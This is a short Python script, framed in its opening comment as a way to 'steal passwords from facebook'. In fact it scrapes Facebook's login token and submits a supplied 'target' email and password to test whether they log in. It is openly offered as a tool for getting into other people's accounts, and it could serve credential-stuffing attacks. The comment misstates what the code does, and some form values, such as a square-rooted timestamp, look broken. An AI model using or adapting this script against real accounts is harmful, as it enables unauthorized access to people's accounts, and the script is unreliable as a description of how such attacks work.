# now we are going to steal passwords from facebook using python script
import requests
from bs4 import BeautifulSoup
import time
import math
def facebook_login(session: requests.session, email: str, password: str) -> bool:
    facebook_login_url = "https://www.facebook.com/Login.php"
    Login_page = session.get(facebook_login_url)
    soup = BeautifulSoup(Login_page.text, 'html.parser')
    lsd_input = soup.find('input', {'name': 'lsd'})
    lsd_value = lsd_input['value'] if lsd_input else ''
    payload = {
        'email': email,
        'pass': password,
        'lsd': lsd_value,
        'default_persistent': '0',
        'timezone': '-60',
        'lgndim': '',
        'lgnrnd': '',
        'lgnjs': str(int(math.sqrt(time.time() * 1000))),

    }    
    response = session.post(facebook_login_url, data=payload)
    return 'c_user' in session.cookies
if __name__ == "__main__":
    email = "" # target email
    password = "" # target password
    with requests.session() as session:
        if facebook_login(session=session, email=email, password=password):
            print(F"SUCCESFULLY logged into facebook account: {email}")
        else:
            print("Failed to log into facebook account.")
